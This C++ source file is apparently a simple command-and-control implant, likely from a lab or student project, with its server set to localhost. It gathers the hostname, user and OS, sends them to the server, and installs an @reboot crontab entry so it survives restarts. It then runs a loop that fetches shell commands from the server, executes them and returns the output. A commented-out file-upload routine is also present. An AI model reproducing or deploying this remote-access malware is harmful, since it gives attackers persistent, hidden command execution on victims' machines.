#include <string>
//#include <stdio.h>
//#include <stdlib.h>
#include <thread>
#include <chrono>
#include <iostream>
#include "curl/curl.h"
#include <sys/stat.h>
#include <fstream>

using namespace std; 

const string HOST_URL = "http://127.0.0.1:3000/";

string get_os() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __APPLE__
    return "Apple";
    #elif __ANDROID__
    return "Android";
    #elif __linux__
    return "Linux";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}

size_t write_data(void *contents, size_t size, size_t nmemb, void *userp) {
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

string exec(string cmd) {
    array<char, 128> buffer;
    string output;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);

    if (!pipe) {
        throw runtime_error("popen() failed!");
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        output += buffer.data();
    }

    output.erase(output.length()-1); // remove last newline

    return output;
}

string get(string url) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    return read_buffer;
}

string post(string url, string data) {
    CURL *curl = curl_easy_init();
    CURLcode res;
    string read_buffer;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());
        curl_easy_setopt(curl, CURLOPT_POST, 1);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);

        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return read_buffer;
}

void download_file(string url, string location) {
    CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;

    if (curl) {
        fp = fopen(location.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_file);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

static size_t read_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    curl_off_t nread;
    size_t retcode = fread(ptr, size, nmemb, stream);
    nread = (curl_off_t)retcode;
    return retcode;
}


void upload_file(string url, string location) {
    //Shell method
    //exec("curl -X POST '" + url + "' --data '@" + location + "'");

    //CURL Method
    /*CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;
    struct stat file_info;
    curl_off_t fsize;

    string fileType = location;
    size_t idx;

    idx = fileType.find(".");

    string result = fileType.substr(idx+1);

    if(result == "txt")
        result = "text/plain";

    struct curl_slist *headers = NULL;

    string contentType = "Content-Type: " + result;

    headers = curl_slist_append(headers, contentType.c_str());

    fp = fopen(location.c_str(), "rb");
    if(!fp)
        return;

    if(fstat(fileno(fp), &file_info) != 0)
        return;

    if (curl) {
        //curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_data_file);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        
        curl_easy_setopt(curl, CURLOPT_READDATA, fp);

        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }*/
}

void make_shell_persistance(){
    //Create shell script to launch implant
    string file_path = "'" + exec("readlink -f a.out") + "'";
    string shellfile = "#! /bin/sh\n" + file_path;

    //Write script to file
    const char *write_path = "script.sh";
    std::ofstream out(write_path);
    out << shellfile;
    out.close();

    //Get persistance of launch script
    string script_path = exec("readlink -f script.sh");
    cout << script_path << endl;
    string sys_cmd = "(crontab -l; echo '@reboot sh "+ script_path +"' ) | crontab -";

    //Run scrip on Linux
    string os = get_os();
    if(os == "Linux"){
        system(sys_cmd.c_str());
    }
}

int main() {
    string hostname = exec("hostname");
    string user = exec("id -un");
    string os = get_os();

    make_shell_persistance();

    string id = "";
    while(id == "")
    {
        id = post(HOST_URL + "connect", "hostname=" + hostname +
                "&user=" + user + "&os=" + os);
        this_thread::sleep_for(chrono::seconds(3));
    }

    //Local file test
    //upload_file(HOST_URL + "fileupload", "/home/davidpruitt/Desktop/Files/text.txt");


    while (true) {
        string command = post(HOST_URL + "command", "id=" + id);

        if (!command.empty()) {
            string output = exec(command);
            post(HOST_URL + "output", "id=" + id + "&output=" + output);
        }

        this_thread::sleep_for(chrono::seconds(3));
    }

    return 0;
}
